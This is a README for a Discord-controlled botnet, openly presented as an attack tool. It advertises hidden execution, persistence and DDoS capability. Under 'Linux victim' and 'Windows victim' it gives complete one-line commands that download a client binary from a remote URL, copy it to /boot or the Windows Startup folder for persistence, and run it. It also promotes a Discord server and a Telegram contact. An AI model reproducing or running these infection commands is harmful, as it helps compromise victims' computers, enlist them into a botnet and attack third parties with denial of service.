# Discord.py BotNet
![image](https://user-images.githubusercontent.com/104208624/203850054-f1e4bfbb-cd76-4914-99e4-f37f849dba99.png)

https://discord.gg/vCdPTjD6rZ

# Features
* Hidden (Works in /tmp, %temp% + Console is always hidden)
* Persistence (Copying to /boot, shell:startup)
* Tested on Windows and Linux platforms
* DDoS attack uses "storm" script

# Commands
![image](https://user-images.githubusercontent.com/104208624/203849645-908bde50-bd0a-49fa-9a8a-1f948953677e.png)

# Linux victim
cd /tmp; apt-get update -y; apt-get install curl -y; curl -O LClient "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 LClient; cp LClient /boot; ./LClient

# Windows victim
cd %temp% && powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile WClient.exe && copy WClient.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && WClient.exe

# Credits
Orig - batu.sh#9675

TG @udbnt
